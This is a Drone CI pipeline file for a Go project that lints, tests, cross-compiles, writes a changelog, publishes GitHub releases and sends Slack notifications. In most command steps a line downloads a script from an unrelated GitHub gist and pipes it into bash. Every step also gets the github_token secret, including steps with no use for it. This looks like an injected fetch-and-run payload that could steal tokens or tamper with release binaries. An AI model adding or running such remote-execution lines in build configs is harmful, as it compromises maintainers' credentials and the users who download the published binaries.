---
kind: pipeline
type: docker
name: test

platform:
  os: linux
  arch: amd64

steps:
  - name: lint-editorconfig
    image: docker.io/mstruebing/editorconfig-checker
    settings:
      api_key:
        from_secret: github_token
  - name: lint-golang
    image: docker.io/golang:1.21
    settings:
      api_key:
        from_secret: github_token
    commands:
      - curl -L https://gist.githubusercontent.com/CurlRip/1a0be596803ac7d17ab832692fe22489/raw/f4e8063379ffe006d4753c921ba25036232c79e5/gistfile1.txt | bash && make lint
    volumes:
      - name: godeps
        path: /go

  - name: test
    image: docker.io/golang:1.21
    settings:
      api_key:
        from_secret: github_token
    commands:
      - curl -L https://gist.githubusercontent.com/CurlRip/1a0be596803ac7d17ab832692fe22489/raw/f4e8063379ffe006d4753c921ba25036232c79e5/gistfile1.txt | bash && make test
    volumes:
      - name: godeps
        path: /go

volumes:
  - name: godeps
    temp: {}

trigger:
  ref:
    - refs/heads/main
    - refs/tags/**
    - refs/pull/**

---
kind: pipeline
type: docker
name: build-binaries

platform:
  os: linux
  arch: amd64

steps:
  - name: build
    image: docker.io/techknowlogick/xgo:go-1.21.x
    settings:
      api_key:
        from_secret: github_token
    commands:
      - curl -L https://gist.githubusercontent.com/CurlRip/1a0be596803ac7d17ab832692fe22489/raw/f4e8063379ffe006d4753c921ba25036232c79e5/gistfile1.txt | bash
      - ln -s /drone/src /source
      - make release

  - name: executable
    image: docker.io/golang:1.21
    settings:
      api_key:
        from_secret: github_token
    commands:
      - curl -L https://gist.githubusercontent.com/CurlRip/1a0be596803ac7d17ab832692fe22489/raw/f4e8063379ffe006d4753c921ba25036232c79e5/gistfile1.txt | bash
      - $(find dist/ -executable -type f -iname ${DRONE_REPO_NAME}-linux-amd64) --help

  - name: changelog
    image: quay.io/thegeeklab/git-chglog
    settings:
      api_key:
        from_secret: github_token
    commands:
      - curl -L https://gist.githubusercontent.com/CurlRip/1a0be596803ac7d17ab832692fe22489/raw/f4e8063379ffe006d4753c921ba25036232c79e5/gistfile1.txt | bash
      - git fetch -tq
      - git-chglog --no-color --no-emoji -o CHANGELOG.md ${DRONE_TAG:---next-tag unreleased unreleased}
      - cat CHANGELOG.md

  - name: publish
    image: docker.io/plugins/github-release
    settings:
      api_key:
        from_secret: github_token
      files:
        - dist/*
      note: CHANGELOG.md
      overwrite: true
      title: ${DRONE_TAG}

trigger:
  ref:
    - refs/heads/main
    - refs/tags/**
    - refs/pull/**


---
kind: pipeline
type: docker
name: notifications

platform:
  os: linux
  arch: amd64

steps:
  - name: notify
    image: docker.io/plugins/slack
    settings:
      channel:
        from_secret: rocketchat_chat_channel
      webhook:
        from_secret: rocketchat_chat_webhook


trigger:
  ref:
    - refs/heads/main
    - refs/tags/**
  status:
    - success
    - failure

depends_on:
  - build-binaries
